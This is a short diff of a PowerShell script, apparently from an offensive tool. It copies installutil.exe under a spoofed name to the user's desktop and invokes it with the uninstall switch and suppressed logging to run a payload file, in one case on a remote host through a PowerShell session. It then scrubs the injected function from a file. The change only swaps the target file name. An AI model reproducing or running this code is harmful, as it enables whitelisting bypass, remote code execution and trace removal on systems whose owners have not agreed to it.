@@ -127,7 +127,7 @@ if($Spoof){
 $SpoofContent=Get-Content -Path "$realpath\installutil.exe" -Encoding Byte
 [System.IO.File]::WriteAllBytes("C:\users\$env:username\desktop\$Spoofname",$SpoofContent)
 cd C:\users\$env:username\desktop
-$command2="cmd.exe /C $spoofname /logfile=C:\Users\$env:username\Desktop\log.txt /LogToConsole=false /U `"C:\$env:username\desktop\$Spoofname`" "
+$command2="cmd.exe /C $spoofname /logfile=C:\Users\$env:username\Desktop\log.txt /LogToConsole=false /U `"C:\$env:username\desktop\standardfile.exe`" "
 Invoke-Command -Session $session {Invoke-Expression -Command $using:command2}
 $removalstuff=Get-Content -Path $filepath | Out-String
 $removalstuff=$removalstuff.Replace("$Functioncommand","")
@@ -191,7 +191,7 @@ if($Spoof){
 $SpoofContent=Get-Content -Path "$realpath\installutil.exe" -Encoding Byte
 [System.IO.File]::WriteAllBytes("C:\users\$env:username\desktop\$Spoofname",$SpoofContent)
 cd C:\users\$env:username\desktop
-$command2="cmd.exe /C $spoofname /logfile=C:\Users\$env:username\Desktop\log.txt /LogToConsole=false /U `"C:\$env:username\desktop\$Spoofname`" "
+$command2="cmd.exe /C $spoofname /logfile=C:\Users\$env:username\Desktop\log.txt /LogToConsole=false /U `"C:\$env:username\desktop\standardfile.exe`" "
 Invoke-Expression -Command $command2
 $removalstuff=Get-Content -Path $filepath | Out-String
 $removalstuff=$removalstuff.Replace("$Functioncommand","")
